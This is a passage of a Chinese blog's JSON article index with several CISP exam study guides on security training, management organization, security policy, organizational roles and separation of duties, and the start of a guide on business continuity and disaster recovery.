安全基础、安全开发、安全运维 掌握安全技术和规范 技术培训、实操演练 季度 全体员工 安全意识、基础知识、日常规范 全员安全意识教育 在线学习、集中培训 年度 💡 培训体系的四大任务1. 高层管理者培训（一把手） 对象：集团公司下属单位的总经理（一把手） 内容：网络安全法培训 原因：网络安全上升到国家安全的高度，必须得到足够重视 目标：明确法律责任，提供战略支持 2. 安全管理岗人员培训 对象：下级单位的网络安全管理岗人员 内容：全面安全培训，建议通过CISP认证 原因：确保人员能力得到保障 目标：建立专业的安全管理团队 3. 信息化相关人员培训 对象：网络管理员、软件开发人员 内容：安全基础培训 原因：使相关人员对网络安全有所了解 目标：在日常工作中融入安全考虑 4. 全员培训 对象：全体员工 内容：信息安全意识及基础安全知识 原因：实现全员信息安全意识教育 目标：建立安全文化，人人参与安全 4.3 高层管理者培训的重要性 为什么要培训高层管理者（一把手）： graph LR A[\"高层管理者培训的必要性\"] B[\"法律责任\"] C[\"战略支持\"] D[\"资源保障\"] E[\"文化建设\"] A --> B A --> C A --> D A --> E B --> B1[\"网络安全法明确责任\"] B --> B2[\"违规可能承担法律后果\"] C --> C1[\"安全纳入企业战略\"] C --> C2[\"支持安全项目\"] D --> D1[\"预算支持\"] D --> D2[\"人员配置\"] E --> E1[\"自上而下推动\"] E --> E2[\"建立安全文化\"] style A fill:#e3f2fd,stroke:#1976d2 style B fill:#ffcdd2,stroke:#c62828 style C fill:#c5e1a5,stroke:#558b2f style D fill:#fff9c4,stroke:#f57f17 style E fill:#b2dfdb,stroke:#00695c ⚠️ 网络安全法的要求《中华人民共和国网络安全法》明确规定： 网络运营者应当履行网络安全保护义务 关键信息基础设施运营者承担更高的安全责任 违反规定可能面临行政处罚甚至刑事责任 主要负责人（一把手）对网络安全负有管理责任 因此： 高层管理者必须了解网络安全法 明确自身的法律责任和义务 为安全工作提供必要的支持 4.4 CISP认证的价值 为什么建议安全管理人员通过CISP认证： ✅ 专业能力认证 系统的知识体系 行业认可的资质 专业能力的证明 ✅ 知识体系完整 信息安全保障 信息安全技术 信息安全管理 信息安全工程 信息安全标准法规 ✅ 实践能力提升 理论与实践结合 案例分析能力 问题解决能力 4.5 培训效果评估 培训效果评估方法： 培训效果评估 ├── 即时评估 │ ├── 培训满意度调查 │ ├── 课堂测验 │ └── 现场反馈 │ ├── 短期评估 │ ├── 知识掌握测试 │ ├── 技能操作考核 │ └── 行为观察 │ └── 长期评估 ├── 安全事件减少率 ├── 安全意识提升度 └── 合规性改善情况 培训记录管理： 📋 培训计划和大纲 📝 培训签到记录 📊 培训考核成绩 📄 培训证书管理 📈 培训效果评估报告 五、人员安全管理最佳实践 建立安全文化： 🎯 意识培养 定期安全培训 安全意识宣传 安全事件分享 奖惩机制 🔐 技术支持 最小权限原则 权限自动化管理 行为监控和审计 异常检测告警 📋 制度保障 完善的管理制度 清晰的流程规范 明确的责任划分 有效的监督机制 总结 人员安全管理的核心在于： 全生命周期管理：从招聘到离职后的完整管理 重点控制离职：离职时必须清除所有访问权限 补偿性控制：职责分离难以实施时采取补偿措施 分层培训体系：建立覆盖全员的培训计划 持续性管理：安全管理是持续的过程，不是一次性工作 🎯 关键要点 人员安全管理是最难也是最重要的环节 重要岗位入职前需要背景调查 离职时必须清除所有逻辑访问账号 职责分离难以实施时应采取补偿性控制措施 保密义务在离职后持续有效 建立分层培训体系，从高层到全员 高层管理者需要接受网络安全法培训 安全管理人员建议通过CISP认证 💡 实践建议 建立标准化的入职和离职流程 使用自动化工具管理权限生命周期 定期进行权限审查和清理 建立离职人员权限清除检查清单 保持离职人员联系方式以便必要时联系","categories":[{"name":"Cybersecurity","slug":"Cybersecurity","permalink":"https://neo01.com/categories/Cybersecurity/"}],"tags":[{"name":"CISP","slug":"CISP","permalink":"https://neo01.com/tags/CISP/"}],"lang":"zh-CN"},{"title":"CISP学习指南：信息安全管理组织","slug":"2025/10/CISP-Security-Management-Organization-zh-CN","date":"un00fin00","updated":"un33fin33","comments":true,"path":"/zh-CN/2025/10/CISP-Security-Management-Organization/","permalink":"https://neo01.com/zh-CN/2025/10/CISP-Security-Management-Organization/","excerpt":"深入解析CISP认证中的信息安全管理组织知识点，涵盖组织结构、保密协议、外部关系和访问管理。","text":"信息安全管理组织是连接战略与执行的桥梁，有效的组织设计和外部关系管理是确保安全管理落地的关键。 一、组织结构与人员配置 💡 组织设计原则信息安全管理组织应该是跨部门的协作机制，而非孤立的专职团队。 组织人员来源： graph LR A[\"信息安全管理组织\"] B[\"不同部门代表\"] C[\"专职人员\"] D[\"兼职人员\"] E[\"外部专家\"] A --> B A --> C A --> D A --> E B --> B1[\"IT部门\"] B --> B2[\"业务部门\"] B --> B3[\"法务部门\"] B --> B4[\"人力资源\"] C --> C1[\"条件允许时\"] D --> D1[\"条件不允许时\"] E --> E1[\"特定领域专家\"] E --> E2[\"顾问咨询\"] style A fill:#e3f2fd,stroke:#1976d2 style B fill:#e8f5e9,stroke:#388e3d style C fill:#fff3e0,stroke:#f57c00 style D fill:#fff3e0,stroke:#f57c00 style E fill:#f3e5f5,stroke:#7b1fa2 组织设计要点： 要素 要求 说明 人员来源 应来自不同的部门 确保全面覆盖和跨部门协作 专职/兼职 根据条件灵活配置 专职为佳，条件不允许可兼职 外部专家 应考虑聘请 补充专业能力和独立视角 沟通机制 必须建立 确保信息流通和协调配合 ⚠️ 常见误区错误：信息安全管理组织的所有人员应该为专职人员。 正确：信息安全管理组织人员如条件允许应为专职人员，如条件不允许可考虑由其他岗位人员兼职。组织应根据自身规模和资源情况灵活配置。 二、保密协议管理 组织间保密协议的关键要素： graph LR A[\"保密协议\"] B[\"需要保护的信息\"] C[\"协议持续时间\"] D[\"违反后的措施\"] E[\"其他条款\"] F[\"人员数量要求\"] A --> B A --> C A --> D A --> E B --> B1[\"信息分类\"] B --> B2[\"保护范围\"] C --> C1[\"生效日期\"] C --> C2[\"终止条件\"] D --> D1[\"法律责任\"] D --> D2[\"赔偿条款\"] E --> E1[\"信息使用限制\"] E --> E2[\"信息返还/销毁\"] style A fill:#e3f2fd,stroke:#1976d2 style B fill:#e8f5e9,stroke:#388e3d style C fill:#e8f5e9,stroke:#388e3d style D fill:#e8f5e9,stroke:#388e3d style E fill:#e8f5e9,stroke:#388e3d style F fill:#ffebee,stroke:#c62828 保密协议必须包含的内容： ✅ 需要保护的信息：明确哪些信息属于保密范围 ✅ 协议期望持续时间：明确协议的有效期 ✅ 违反协议后采取的措施：明确违约责任和补救措施 ✅ 信息使用限制：明确信息的使用目的和范围 ✅ 信息返还或销毁：明确协议终止后的信息处理 ❌ 不需要包含的内容： 合同双方的人员数量要求（与保密无直接关系） 三、外部关系管理 需要保持联系的外部机构： graph LR A[\"信息安全管理日常工作\"] B[\"政府部门\"] C[\"监管机构\"] D[\"外部专家\"] E[\"行业组织\"] A --> B A --> C A --> D A --> E B --> B1[\"公安机关（犯罪取证）\"] B --> B2[\"网信办\"] B --> B3[\"工信部\"] C --> C1[\"行业监管机构\"] C --> C2[\"数据保护机构\"] D --> D1[\"安全顾问\"] D --> D2[\"技术专家\"] D --> D3[\"安全组织\"] E --> E1[\"行业协会\"] E --> E2[\"安全社区\"] style A fill:#e3f2fd,stroke:#1976d2 style B fill:#e8f5e9,stroke:#388e3d style C fill:#fff3e0,stroke:#f57c00 style D fill:#f3e5f5,stroke:#7b1fa2 style E fill:#fce4ec,stroke:#c2185b 与外部专家合作的价值： 合作内容 价值 最佳实践和最新知识 了解行业领先做法和技术趋势 攻击和脆弱点警告 尽早接收安全威胁情报 补丁和建议 及时获取安全更新和修复方案 技术和产品信息 分享新技术、产品、威胁或脆弱点信息 独立评估 获得客观的安全评估和建议 💡 计算机犯罪取证当怀疑信息安全事故可能触犯了法律时，应及时与政府部门（特别是公安机关）取得联系，进行计算机犯罪取证。这是法律要求，也是保护组织利益的必要措施。 四、外部访问管理 客户和外部组织访问信息资产的管理原则： graph LR A[\"外部访问请求\"] B[\"访问前\"] C[\"访问中\"] D[\"访问后\"] A --> B B --> C C --> D B --> B1[\"获得批准\"] B --> B2[\"签署协议\"] B --> B3[\"安全培训\"] C --> C1[\"传达安全要求\"] C --> C2[\"提醒注意事项\"] C --> C3[\"监控访问行为\"] D --> D1[\"访问记录\"] D --> D2[\"权限回收\"] D --> D3[\"效果评估\"] style A fill:#e3f2fd,stroke:#1976d2 style B fill:#fff3e0,stroke:#f57c00 style C fill:#e8f5e9,stroke:#388e3d style D fill:#f3e5f5,stroke:#7b1fa2 正确的访问管理做法： ✅ 访问前批准：访问前应得到信息资产所有者或管理者的批准 ✅ 传达安全要求：应向其传达信息安全要求及应注意的信息安全问题 ✅ 签署保密协议：使用敏感信息资产时，必须签订包含信息安全要求的协议 ✅ 确保安全保护：应确保相关信息处理设施和信息资产得到可靠的安全保护 ✅ 告知重要性：告知信息资产的重要性和使用时间限制 ❌ 错误做法： 为了信息资产更加安全，禁止外部组织人员访问信息资产（过于绝对） 不加干涉，由客户自己访问信息资产（缺乏管理） ⚠️ 敏感信息访问的特殊要求外部组织需要使用敏感信息时，必须： 得到信息所有者或管理者的允许 签订包含信息安全要求的协议 明确信息使用范围和时间限制 确保信息使用后的安全处理 总结 信息安全管理组织的核心在于： 跨部门协作：建立跨部门的协作机制 灵活配置：根据条件灵活配置专职和兼职人员 保密管理：建立完善的保密协议管理机制 外部联系：保持与政府、监管、专家和行业组织的联系 访问控制：建立完整的外部访问管理流程 🎯 关键要点 组织人员可以专职或兼职，根据条件灵活配置 保密协议不需要包含人员数量要求 涉及犯罪取证时应联系政府部门 外部访问需要全流程管理：访问前、中、后","categories":[{"name":"Cybersecurity","slug":"Cybersecurity","permalink":"https://neo01.com/categories/Cybersecurity/"}],"tags":[{"name":"CISP","slug":"CISP","permalink":"https://neo01.com/tags/CISP/"}],"lang":"zh-CN"},{"title":"CISP学习指南：安全策略","slug":"2025/10/CISP-Security-Policy-zh-CN","date":"un66fin66","updated":"un33fin33","comments":true,"path":"/zh-CN/2025/10/CISP-Security-Policy/","permalink":"https://neo01.com/zh-CN/2025/10/CISP-Security-Policy/","excerpt":"深入解析CISP认证中的安全策略知识点，涵盖文件层次结构、策略要素、评审机制和管理者承诺。","text":"安全策略是组织信息安全管理的基础和指导方针，建立完善的策略体系对于确保安全管理的系统性和有效性至关重要。 一、信息安全管理体系文件层次 信息安全管理体系采用分层文件结构，确保从战略到执行的完整覆盖。 graph TB subgraph 第一层[\"第一层：方针策略\"] A[\"信息安全方针政策\"] end subgraph 第二层[\"第二层：程序文件\"] B[\"信息安全工作程序\"] end subgraph 第三层[\"第三层：作业指导\"] C[\"信息安全作业指导书\"] end subgraph 第四层[\"第四层：记录文件\"] D[\"信息安全工作记录\"] end A --> B B --> C C --> D style 第一层 fill:#e8eaf6,stroke:#3f51b5 style 第二层 fill:#f3e5f5,stroke:#9c27b0 style 第三层 fill:#e0f2f1,stroke:#009688 style 第四层 fill:#fff3e0,stroke:#ff9800 各层文件特点： 层次 文件类型 特点 示例 第一层 方针政策 高层战略文件，体现管理承诺 信息安全方针、安全政策 第二层 工作程序 具体流程和步骤 访问控制程序、变更管理程序 第三层 作业指导书 详细操作指南 密码设置指南、备份操作手册 第四层 工作记录 执行证据和审计轨迹 访问日志、变更记录 二、安全策略的关键要素 💡 安全策略的核心特征安全策略是组织信息安全管理的基础，必须具备以下特征： 必须具备的要素： ✅ 管理层批准：信息安全策略应得到组织的最高管理者批准 ✅ 管理承诺：应包括管理层对信息安全管理工作的承诺 ✅ 明确所有者：策略应有一个所有者，负责按复查程序维护和复查该策略 ✅ 定期更新：应根据实际情况定期进行更新与修订 ✅ 有效传达：应传达给所有员工和外部相关方 常见误区： ❌ 错误观念：安全策略一旦建立和发布，则不可变更 ✅ 正确理解：安全策略应该是动态的，随着业务环境、技术发展和威胁变化而不断更新 策略文件形式： 信息安全策略必须形成正式的文件，可以是： 📄 电子文件形式 📋 纸质文件形式 🔄 两者结合 ⚠️ 注意策略文件不必须打印成纸质形式分发，可以根据组织实际情况选择合适的分发方式。 三、安全策略的评审 💡 策略评审原则安全策略应按计划的时间间隔或当重大变化发生时进行评审，以确保其持续的适宜性、充分性和有效性。 评审触发条件： graph LR A[\"策略评审触发\"] B[\"定期评审\"] C[\"事件驱动评审\"] A --> B A --> C B --> B1[\"按组织定义的周期\"] B --> B2[\"不固定为每年两次\"] C --> C1[\"业务重大变化\"] C --> C2[\"法律法规变化\"] C --> C3[\"技术环境变化\"] C --> C4[\"重大安全事件\"] style A fill:#e3f2fd,stroke:#1976d2 style B fill:#e8f5e9,stroke:#388e3d style C fill:#fff3e0,stroke:#f57c00 评审考虑因素： 评审维度 具体内容 示例 业务变化 组织业务的重大变化 新业务线、并购重组、市场扩张 法律法规 相关法律法规的重大变化 数据保护法、网络安全法更新 技术环境 技术环境的重大变化 云迁移、新技术采用、架构升级 威胁态势 安全威胁的变化 新型攻击手段、行业安全事件 审计发现 内外部审计结果 合规差距、控制缺陷 评审责任： ✅ 专人负责：信息安全策略应由专人负责制定、评审 ✅ 管理层参与：高层管理者应参与评审和批准 ✅ 跨部门协作：涉及相关部门共同参与 ⚠️ 常见误区错误：信息安全策略评审每年应进行两次，上半年、下半年各进行一次。 正确：评审周期需要按照组织实际情况进行定义，不应固定为每年两次。组织应根据自身规模、业务特点、风险状况等因素确定合适的评审周期。 四、高层管理者的安全承诺 高层管理者对信息安全的支持是安全管理成功的关键。 graph TB A[\"高层管理者承诺\"] B[\"制定、评审、批准信息安全方针\"] C[\"提供明确的方向和支持\"] D[\"提供所需的资源\"] E[\"战略层面决策\"] F[\"执行、监督与检查\"] G[\"日常运营管理\"] A --> B A --> C A --> D A --> E style A fill:#e3f2fd,stroke:#1976d2 style B fill:#e8f5e9,stroke:#388e3d style C fill:#e8f5e9,stroke:#388e3d style D fill:#e8f5e9,stroke:#388e3d style E fill:#e8f5e9,stroke:#388e3d style F fill:#ffebee,stroke:#c62828 style G fill:#ffebee,stroke:#c62828 高层管理者的主要职责： ✅ 战略层面： 制定、评审、批准信息安全方针 为信息安全提供明确的方向和支持 为信息安全提供所需的资源（人力、财力、物力） 确保信息安全与业务目标一致 ❌ 非主要职责： 对各项信息安全工作进行执行、监督与检查（这是安全管理部门和各业务部门的职责） 💡 理解要点高层管理者应该关注战略层面的决策和资源支持，而不是具体的执行和日常监督工作。具体的执行、监督与检查工作应由专门的安全管理组织和各业务部门负责。 总结 安全策略管理的核心在于： 层次清晰：建立从方针到记录的完整文件体系 要素完整：确保策略包含所有必要要素 动态更新：根据环境变化及时评审和更新 高层支持：获得管理层的承诺和资源支持 🎯 关键要点 第一层文件是信息安全方针政策 策略应该是动态的，可以更新 评审周期应根据组织实际情况定义 高层管理者关注战略，不负责具体执行","categories":[{"name":"Cybersecurity","slug":"Cybersecurity","permalink":"https://neo01.com/categories/Cybersecurity/"}],"tags":[{"name":"CISP","slug":"CISP","permalink":"https://neo01.com/tags/CISP/"}],"lang":"zh-CN"},{"title":"CISP学习指南：安全组织机构","slug":"2025/10/CISP-Security-Organization-Structure-zh-CN","date":"un55fin55","updated":"un33fin33","comments":true,"path":"/zh-CN/2025/10/CISP-Security-Organization-Structure/","permalink":"https://neo01.com/zh-CN/2025/10/CISP-Security-Organization-Structure/","excerpt":"深入解析CISP认证中的安全组织机构知识点，涵盖人员风险评估、职责分离原则和关键角色职责划分。","text":"安全组织机构是信息安全管理的基础，合理的组织架构和明确的职责划分是确保安全管理有效性的关键。 一、信息安全管理体制 1.1 我国信息安全管理格局 我国信息安全管理采用多方&quot;齐抓共管&quot;的体制，多个部门共同参与信息安全管理工作。 主要管理部门及职责： graph LR A[\"我国信息安全管理体制\"] B[\"国家保密局\"] C[\"公安部\"] D[\"工信部\"] E[\"国家密码管理局\"] F[\"网信办\"] A --> B A --> C A --> D A --> E A --> F B --> B1[\"保密管理《计算机信息系统国际联网保密管理规定》\"] C --> C1[\"网络安全监管《计算机信息系统安全保护条例》\"] D --> D1[\"信息产业管理通信网络安全\"] E --> E1[\"密码管理商用密码管理\"] F --> F1[\"网络内容管理网络安全协调\"] style A fill:#e3f2fd,stroke:#1976d2 style B fill:#e8f5e9,stroke:#388e3d style C fill:#fff3e0,stroke:#f57c00 style D fill:#f3e5f5,stroke:#7b1fa2 style E fill:#fce4ec,stroke:#c2185b style F fill:#e1f5fe,stroke:#0277bd 主要法规及制定部门： 法规名称 制定部门 主要内容 《计算机信息系统国际联网保密管理规定》 国家保密局 涉密信息系统联网保密管理 《计算机信息系统安全保护条例》 公安部 信息系统安全等级保护 《网络安全法》 全国人大 网络安全基本法律 《商用密码管理条例》 国家密码管理局 商用密码产品和服务管理 💡 多头管理特点&quot;齐抓共管&quot;体制的特点： ✅ 优势： 全面覆盖信息安全各个领域 各部门发挥专业优势 形成多层次监管体系 ⚠️ 挑战： 法出多门，需要协调 可能存在职责交叉 企业需要对接多个部门 二、人员风险评估 💡 核心概念在信息安全管理中，不同类型的人员带来的风险程度各不相同。 风险等级排序： (function() { if (typeof echarts !== 'undefined') { var chart = echarts.init(document.getElementById('chart_4ace837aa')); var option = { \"title\": { \"text\": \"不同人员类型的安全风险等级\" }, \"tooltip\": { \"trigger\": \"axis\", \"axisPointer\": { \"type\": \"shadow\" } }, \"xAxis\": { \"type\": \"category\", \"data\": [\"临时工\", \"咨询人员\", \"以前员工\", \"当前员工\"] }, \"yAxis\": { \"type\": \"value\", \"name\": \"风险等级\", \"max\": 100 }, \"series\": [{ \"type\": \"bar\", \"data\": [ {\"value\": 30, \"itemStyle\": {\"color\": \"#4caf50\"}}, {\"value\": 35, \"itemStyle\": {\"color\": \"#8bc34a\"}}, {\"value\": 40, \"itemStyle\": {\"color\": \"#ff9800\"}}, {\"value\": 95, \"itemStyle\": {\"color\": \"#f44336\"}} ], \"label\": { \"show\": true, \"position\": \"top\" } }] }; chart.setOption(option); } })(); 为什么当前员工风险最高？ ✅ 访问权限最广：拥有系统的合法访问权限 ✅ 资源最多：可以接触到核心业务数据和系统 ✅ 机会最大：日常工作中有大量操作机会 ✅ 误操作风险：频繁操作增加出错可能性 ✅ 恶意操作可能：内部威胁往往比外部攻击更难防范 二、职责分离原则 职责分离（Separation of Duties, SoD）是信息安全管理的基石原则之一。 graph LR A[\"开发人员\"] -.不应访问.-> B[\"生产数据\"] C[\"程序员\"] -.不应使用.-> D[\"系统控制台\"] E[\"系统维护员\"] -.不应负责.-> F[\"应用开发\"] G[\"磁带操作员\"] -.不应使用.-> H[\"系统控制台\"] style A fill:#e3f2fd,stroke:#1976d2 style C fill:#e3f2fd,stroke:#1976d2 style E fill:#e3f2fd,stroke:#1976d2 style G fill:#e3f2fd,stroke:#1976d2 style B fill:#ffebee,stroke:#c62828 style D fill:#ffebee,stroke:#c62828 style F fill:#ffebee,stroke:#c62828 style H fill:#ffebee,stroke:#c62828 职责分离的主要目的： 防止一个人从头到尾整个控制某一交易或者活动，降低权限过于集中所带来的风险。 正确的职责分离实践： 角色 应该做的 不应该做的 程序员 编写和测试代码 ❌ 访问生产数据文件❌ 使用系统控制台 系统维护管理员 维护系统运行 ❌ 开发应用程序 控制台操作员 监控系统状态 ❌ 操作磁带和硬盘 磁带操作员 管理备份介质 ❌ 使用系统控制台 ⚠️ 违反职责分离的典型场景场景：系统程序员维护应用系统软件 问题：系统程序员负责系统的开发，如果同时负责系统维护，则违反了职责分离原则。 风险： 可以修改代码并直接部署到生产环境 可以掩盖自己的错误或恶意行为 缺乏必要的审查和制衡机制 三、系统管理员角色定位 3.1 组织层级划分 在信息安全组织架构中，人员通常划分为三个层级： graph LR A[\"组织层级\"] B[\"决策层\"] C[\"管理层\"] D[\"执行层\"] A --> B A --> C A --> D B --> B1[\"高层管理者\"] B --> B2[\"制定战略和方针\"] B --> B3[\"资源分配决策\"] C --> C1[\"安全经理\"] C --> C2[\"制定策略和流程\"] C --> C3[\"监督执行\"] D --> D1[\"系统管理员\"] D --> D2[\"安全工程师\"] D --> D3[\"具体实施和操作\"] style B fill:#e8eaf6,stroke:#3f51b5 style C fill:#f3e5f5,stroke:#9c27b0 style D fill:#e8f5e9,stroke:#388e3d 系统管理员的角色定位： 💡 系统管理员属于执行层为什么系统管理员属于执行层： 🔧 主要职责： 执行具体的技术操作 实施安全策略和配置 日常系统维护和监控 响应技术问题和事件 📋 工作特点： 按照既定策略和流程工作 不负责制定整体策略 专注于技术实施 向管理层汇报 ⚖️ 可能的双重角色： 在小型组织中，系统管理员可能兼具管理职能 高级系统管理员可能参与策略制定 但主要职责仍是执行层面 各层级对比： 层级 主要职责 典型角色 关注重点 决策层 战略决策、资源分配 CEO、CIO、CISO 业务目标、风险管理 管理层 策略制定、监督执行 安全经理、IT经理 策略实施、团队管理 执行层 具体实施、日常运维 系统管理员、工程师 技术操作、问题解决 四、关键角色与职责 信息系统保护级别决策责任： graph TB A[\"业务主管\"] --> B[\"提出保护等级需求\"] B --> C[\"评估业务影响\"] C --> D[\"确定保护级别\"] E[\"信息系统安全专家\"] --> F[\"提供技术建议\"] G[\"安全主管\"] --> H[\"制定安全策略\"] I[\"系统审查员\"] --> J[\"审计合规性\"] style A fill:#4caf50,stroke:#2e7d32 style B fill:#81c784,stroke:#388e3d style C fill:#a5d6a7,stroke:#43a047 style D fill:#c8e6c9,stroke:#66bb6a style E fill:#e0e0e0,stroke:#757575 style F fill:#e0e0e0,stroke:#757575 style G fill:#e0e0e0,stroke:#757575 style H fill:#e0e0e0,stroke:#757575 style I fill:#e0e0e0,stroke:#757575 style J fill:#e0e0e0,stroke:#757575 💡 关键理解业务主管是信息系统需求方，最了解业务价值和影响，因此应该对信息系统资产所需的保护等级提出要求。其他角色虽然参与安全管理，但不是需求方，不负责提出系统保护等级。 数据库管理员（DBA）的职责： ✅ 应该做的： 监控数据存储空间 根据数据增长趋势进行容量规划 优化数据库性能 管理数据备份和恢复 ❌ 不应该做的： 计算机的日常操作 应用程序开发 应用程序维护 五、信息安全组织管理 5.1 内部组织管理 信息安全组织的管理涉及内部组织和外部各方面两个控制目标。为了实现对组织内部信息安全的有效管理，应该实施常规的控制措施。 内部组织管理的常规控制措施： graph LR A[\"内部组织管理\"] B[\"✅ 管理承诺\"] C[\"✅ 安全协调\"] D[\"✅ 职责分配\"] E[\"✅ 授权过程\"] F[\"✅ 保密协议\"] G[\"✅ 政府联系\"] H[\"✅ 利益集团联系\"] I[\"✅ 独立评审\"] J[\"❌ 外部风险识别\"] A --> B A --> C A --> D A --> E A --> F A --> G A --> H A --> I A --> J B --> B1[\"信息安全的管理承诺\"] C --> C1[\"信息安全协调\"] D --> D1[\"信息安全职责的分配\"] E --> E1[\"信息处理设施的授权过程\"] F --> F1[\"保密性协议\"] G --> G1[\"与政府部门的联系\"] H --> H1[\"与特定利益集团的联系\"] I --> I1[\"信息安全的独立评审\"] J --> J1[\"属于外部各方管理\"] style B fill:#e8f5e9,stroke:#388e3d style C fill:#e8f5e9,stroke:#388e3d style D fill:#e8f5e9,stroke:#388e3d style E fill:#e8f5e9,stroke:#388e3d style F fill:#e8f5e9,stroke:#388e3d style G fill:#e8f5e9,stroke:#388e3d style H fill:#e8f5e9,stroke:#388e3d style I fill:#e8f5e9,stroke:#388e3d style J fill:#ffcdd2,stroke:#b71c1c 💡 内部组织管理控制措施属于内部组织管理的控制措施： ✅ 信息安全的管理承诺 高层管理层对信息安全的承诺 明确安全目标和方针 提供必要的资源支持 ✅ 信息安全协调 建立跨部门协调机制 定期召开安全会议 协调安全事务处理 ✅ 信息安全职责的分配 明确各岗位安全职责 建立职责分离机制 定期评审职责分配 ✅ 信息处理设施的授权过程 建立授权审批流程 明确授权范围和期限 定期审查授权情况 ✅ 保密性协议 与员工签订保密协议 与合作伙伴签订保密协议 明确保密责任和义务 ✅ 与政府部门的联系 与监管机构保持沟通 与执法机关建立联系 及时报告重大事件 ✅ 与特定利益集团的联系 与行业组织交流 与安全社区合作 分享威胁情报 ✅ 信息安全的独立评审 定期进行安全审计 独立第三方评估 持续改进安全措施 ❌ 不属于内部组织管理： 与外部各方相关风险的识别 - 属于外部各方管理 处理外部各方协议的安全问题 - 属于外部各方管理 内部组织管理 vs 外部各方管理： 管理类型 控制目标 主要措施 示例 内部组织管理 组织内部安全管理 管理承诺、职责分配、协调机制 安全组织架构、内部审计 外部各方管理 外部关系安全管理 风险识别、协议管理、供应商管理 第三方合同、供应商评估 5.2 外部各方管理 外部各方管理的控制措施： graph LR A[\"外部各方管理\"] B[\"风险识别\"] C[\"协议管理\"] D[\"供应商管理\"] A --> B A --> C A --> D B --> B1[\"识别外部风险\"] B --> B2[\"评估影响程度\"] B --> B3[\"制定缓解措施\"] C --> C1[\"安全条款约定\"] C --> C2[\"职责划分\"] C --> C3[\"安全要求明确\"] D --> D1[\"供应商评估\"] D --> D2[\"安全监督\"] D --> D3[\"定期审查\"] style B fill:#fff3e0,stroke:#f57c00 style C fill:#e3f2fd,stroke:#1976d2 style D fill:#f3e5f5,stroke:#7b1fa2 六、供应商管理 5.1 外部供货商选择标准 选择外部供货商时，需要综合评估多个因素，按重要性排序： 评价标准优先级： graph LR A[\"供货商评价标准\"] B[\"第一优先级\"] C[\"第二优先级\"] D[\"第三优先级\"] E[\"第四优先级\"] A --> B A --> C A --> D A --> E B --> B1[\"信誉、专业知识、技术\"] B --> B2[\"核心能力评估\"] C --> C1[\"财政状况和管理情况\"] C --> C2[\"持续服务能力\"] D --> D1[\"雇员的态度\"] D --> D2[\"服务质量保障\"] E --> E1[\"与信息系统部门的接近程度\"] E --> E2[\"便利性考虑\"] style B fill:#c8e6c9,stroke:#2e7d32 style C fill:#fff3e0,stroke:#f57c00 style D fill:#ffccbc,stroke:#d84315 style E fill:#ffcdd2,stroke:#b71c1c 评价标准详解： 优先级 评价标准 重要性 评估要点 🥇 最高 信誉、专业知识、技术 ⭐⭐⭐⭐⭐ 行业声誉、技术能力、成功案例 🥈 高 财政状况和管理情况 ⭐⭐⭐⭐ 财务稳定性、管理水平、持续经营能力 🥉 中 雇员的态度 ⭐⭐⭐ 服务态度、响应速度、合作意愿 4️⃣ 低 与信息系统部门的接近程度 ⭐⭐ 地理位置、沟通便利性 💡 为什么技术能力最重要信誉、专业知识、技术排第一的原因： 🎯 核心价值 直接决定服务质量 影响项目成功率 关系到长期合作效果 🔒 安全考虑 技术能力影响系统安全性 专业知识确保合规性 良好信誉降低风险 💼 业务影响 技术问题可能导致业务中断 专业能力影响投资回报 信誉保障长期合作 供应商评估流程： 供应商评估步骤： ├── 初步筛选 │ ├── 技术能力评估 │ ├── 行业信誉调查 │ └── 资质认证检查 ├── 深入评估 │ ├── 财务状况审查 │ ├── 管理能力评估 │ └── 客户案例调研 ├── 现场考察 │ ├── 团队能力评估 │ ├── 服务态度观察 │ └── 工作环境了解 └── 综合决策 ├── 加权评分 ├── 风险评估 └── 最终选择 六、总结 安全组织机构的核心在于： 管理体制：理解我国多头管理的信息安全体制 风险认知：正确评估不同人员类型的安全风险 职责分离：通过职责分离降低权限集中风险 角色明确：明确各关键角色的职责边界和层级定位 供应商管理：建立科学的供应商评估和选择机制 🎯 关键要点 《计算机信息系统国际联网保密管理规定》由国家保密局制定 系统管理员属于执行层，负责具体技术实施 供应商选择优先考虑：信誉、专业知识、技术 当前员工是最大的安全风险来源 职责分离是防止权限滥用的基本原则 业务主管负责确定系统保护等级 DBA专注于数据管理，不涉及应用开发","categories":[{"name":"Cybersecurity","slug":"Cybersecurity","permalink":"https://neo01.com/categories/Cybersecurity/"}],"tags":[{"name":"CISP","slug":"CISP","permalink":"https://neo01.com/tags/CISP/"}],"lang":"zh-CN"},{"title":"CISP学习指南：业务连续性管理与灾难恢复","slug":"2025/10/CISP-Business-Continuity-Disaster-Recovery-zh-CN","date":"un44fin44","updated":"un33fin33","comments":true,"path":"/zh-CN/2025/10/CISP-Business-Continuity-Disaster-Recovery/","permalink":"https://neo01.com/zh-CN/2025/10/CISP-Business-Continuity-Disaster-Recovery/","excerpt":"CISP认证考试业务连续性管理与灾难恢复知识点详解，涵盖备份站点类型、灾难恢复计划制定、业务连续性测试等核心内容。","text":"业务连续性管理与灾难恢复是信息安全管理的重要组成部分，确保组织在面临灾难时能够快速恢复关键业务运营。本指南涵盖CISP考试中关于备份站点、灾难恢复计划和业务连续性测试的核心知识点。 知识体系概览 graph TB A[\"业务连续性管理与灾难恢复\"] B[\"备份站点管理\"] C[\"灾难恢复计划\"] D[\"业务连续性测试\"] E[\"恢复策略选择\"] F[\"高可用性与容错设计\"] A --> B A --> C A --> D A --> E A --> F B --> B1[\"冷站\"] B --> B2[\"温站\"] B --> B3[\"热站/镜像站点\"] B --> B4[\"互惠协议\"] B --> B5[\"站点选址\"] C --> C1[\"业务影响分析\"] C --> C2[\"恢复策略制定\"] C --> C3[\"优先级定义\"] C --> C4[\"关键系统识别\"] D --> D1[\"数据备份验证\"] D --> D2[\"人员安全优先\"] D --> D3[\"计划有效性测试\"] D --> D4[\"恢复时间测试\"] E --> E1[\"防止、减轻、恢复\"] E --> E2[\"关键流程优先\"] E --> E3[\"灾难容忍度评估\"] E --> E4[\"RTO/RPO匹配\"] F --> F1[\"数据库实时复制\"] F --> F2[\"网络地理分散\"] F --> F3[\"服务器集群\"] F --> F4[\"冗余路径\"] style A fill:#e3f2fd,stroke:#1976d2 style B fill:#f3e5f5,stroke:#7b1fa2 style C fill:#e8f5e9,stroke:#388e3d style D fill:#fff3e0,stroke:#f57c00 style E fill:#e1f5fe,stroke:#0277bd style F fill:#fff3e0,stroke:#ff6f00 备份站点类型 站点分类对比 备份站点根据准备程度和恢复能力分为三种主要类型： graph LR A[\"冷站Cold Site\"] B[\"温站Warm Site\"] C[\"热站/镜像站点Hot Site/Mirror Site\"] A -->|\"增加设备\"| B B 